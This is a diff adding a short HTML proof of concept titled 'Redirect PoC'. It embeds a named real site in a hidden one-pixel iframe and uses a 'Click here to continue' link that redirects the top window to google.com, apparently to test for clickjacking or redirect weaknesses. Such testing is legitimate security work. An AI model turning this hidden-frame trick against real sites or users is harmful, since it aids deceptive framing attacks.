@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect PoC</title>
+</head>
+<body>
+    <a href="#" id="clickBtn">Click here to continue</a>
+    <iframe src="https://hami.paziresh24.com" width="1" height="1" style="display:none;"></iframe>
+    <script>
+        document.getElementById('clickBtn').addEventListener('click', function (e) {
+            e.preventDefault();
+            window.open('https://www.google.com', '_top');
+        });
+    </script>
+</body>
+</html>
